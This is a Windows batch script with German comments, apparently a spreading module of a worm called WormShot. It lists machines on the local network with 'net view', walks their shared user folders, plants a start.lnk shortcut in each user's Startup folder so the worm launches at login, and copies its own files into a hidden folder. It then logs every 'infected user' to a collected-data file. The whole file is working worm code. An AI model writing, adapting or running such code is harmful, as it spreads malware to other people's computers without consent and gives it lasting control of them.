@echo off
REM ShareWormshot funktioniert nur über search.bat, da setlocal enabledelayedexpansion hier nicht aktiv

for /L %%a in (1 1 6) do (
set var%%a=
)


set strArrayNumber=0
net view | findstr /i "\\" > SYS\CollectedData\Temp\newtarget.tmp
for /f "usebackq" %%i in (`type SYS\CollectedData\Temp\newtarget.tmp`) do (
set /a strArrayNumber=!strArrayNumber! + 1
set pc!strArrayNumber!=%%i
)
 
for /L %%a in (1 1 6) do (
if defined pc%%a if exist "!pc%%a!\users\" dir /B "!pc%%a!\users\" > SYS\CollectedData\Temp\pc%%auser.tmp
)


REM  Public, Default und default.migrated muss nicht ausgeblendet werden, einfach irgendwo nach users\benutzer\desktop\ prüfen und dann installation ausführen. 

set pcnr=0
set wormshare=%date:~0,2%-%date:~3,2%-%date:~6,4%_%time:~0,2%-%time:~3,2%
:definerest
set strArrayNumber=0
if /i !pcnr! GTR 6 goto definecomplete
set /a pcnr=!pcnr!+1
REM Soll auch am lokalen PC auf alle anderen User ausgefuehrt werden. 
set structure=reset
set targetpc=reset
set targetuser=reset

REM Wenn Datei nicht existiert wird Programm sowieso weitergefuehrt, also nichts machen
for /f "usebackq" %%i in (`type SYS\CollectedData\Temp\pc!pcnr!user.tmp`) do (
set /a strArrayNumber=!strArrayNumber! + 1
rem set pc!pcnr!user!strArrayNumber!=%%i
set targetpc=!pc%pcnr%!
set targetuser=%%i
if /i "!targetuser!"=="public" set targetuser=DoNot
if exist "!targetpc!\users\!targetuser!\Desktop\" set structure=old&call :sharewormshot
if exist "!targetpc!\WindowsRecovery$\users\!targetuser!\Desktop\" set structure=new&call :sharewormshot
set pc!pcnr!usermax=!strArrayNumber!
)

if /i !pcnr! LEQ 6 goto definerest
:definecomplete


:sharewormshot
if /i "!targetpc!"=="reset" goto ende
if /i "!targetuser!"=="reset" goto ende
cd SYS
REM Autostart
if /i "!structure:~0,3!"=="old" xcopy "start.lnk" "!targetpc!\users\!targetuser!\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR #Share1#: Start.lnk konnte nicht kopiert werden. >> "Error.txt"
if /i "!structure:~0,3!"=="new" xcopy "start.lnk" "!targetpc!\WindowsRecovery$\users\!targetuser!\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR #Share2#: Start.lnk konnte nicht kopiert werden. >> "Error.txt"

REM WormShot installieren
if /i "!structure:~0,3!"=="old" md "!targetpc!\users\!targetuser!\WormShot"
if /i "!structure:~0,3!"=="new" md "!targetpc!\WindowsRecovery$\users\!targetuser!\WormShot"

if /i "!structure:~0,3!"=="old" attrib +H "!targetpc!\users\!targetuser!\WormShot"
if /i "!structure:~0,3!"=="new" attrib +H "!targetpc!\WindowsRecovery$\users\!targetuser!\WormShot"
cd..&cd..
if /i "!structure:~0,3!"=="old" xcopy "Wormshot\*.*" "!targetpc!\users\!targetuser!\WormShot\" /Y /K /H /Q /E /I 
if /i "!structure:~0,3!"=="new" xcopy "Wormshot\*.*" "!targetpc!\WindowsRecovery$\users\!targetuser!\WormShot\" /Y /K /H /Q /E /I 
cd WormShot
echo PC: !targetpc! - Infizierter User: !targetuser! >> "SYS\CollectedData\WormShare\!wormshare!.wsdt"
:ende